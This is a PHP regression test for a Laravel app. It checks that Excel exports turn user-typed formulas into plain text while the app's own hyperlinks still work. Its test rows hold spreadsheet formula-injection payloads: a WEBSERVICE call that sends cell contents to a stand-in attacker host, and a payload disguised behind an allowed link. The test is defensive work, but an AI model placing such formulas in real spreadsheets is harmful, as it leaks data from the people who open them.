<?php

namespace Tests\Feature;

use Maatwebsite\Excel\Concerns\FromArray;
use Maatwebsite\Excel\Facades\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\TestCase;

/**
 * REGRESSION (security re-audit, MEDIUM). Text that starts with "=" went into
 * every Excel export as a live formula, so an employee's remark or a customer
 * name could run in the spreadsheet of whoever downloaded the report.
 */
class ExcelFormulaInjectionTest extends TestCase
{
    public function test_typed_formulas_become_text_but_the_exports_own_links_still_work(): void
    {
        $own = '=HYPERLINK("' . rtrim(config('app.url'), '/') . '/storage/doc.pdf","View")';
        $maps = '=HYPERLINK("https://www.google.com/maps/search/?api=1&query=28.6,77.2","Open in Google Maps")';
        $rows = [[
            '=WEBSERVICE("http://evil.test/?"&A1)',
            '=HYPERLINK("http://evil.test/","Click")',
            '=HYPERLINK("' . rtrim(config('app.url'), '/') . '/x","a")&WEBSERVICE("http://evil.test")',
            $own,
            $maps,
            'plain', 42,
        ]];

        $export = new class($rows) implements FromArray {
            public function __construct(private array $rows) {}
            public function array(): array { return $this->rows; }
        };

        $path = tempnam(sys_get_temp_dir(), 'xl') . '.xlsx';
        file_put_contents($path, Excel::raw($export, \Maatwebsite\Excel\Excel::XLSX));
        $sheet = IOFactory::load($path)->getActiveSheet();
        @unlink($path);

        foreach (['A1', 'B1', 'C1'] as $c) {
            $this->assertSame(DataType::TYPE_STRING, $sheet->getCell($c)->getDataType(), "$c is text, not a formula");
        }
        $this->assertSame(DataType::TYPE_FORMULA, $sheet->getCell('D1')->getDataType(), 'link to this site still works');
        $this->assertSame(DataType::TYPE_FORMULA, $sheet->getCell('E1')->getDataType(), 'Google Maps link still works');
        $this->assertSame('plain', $sheet->getCell('F1')->getValue());
        $this->assertEquals(42, $sheet->getCell('G1')->getValue());
    }
}
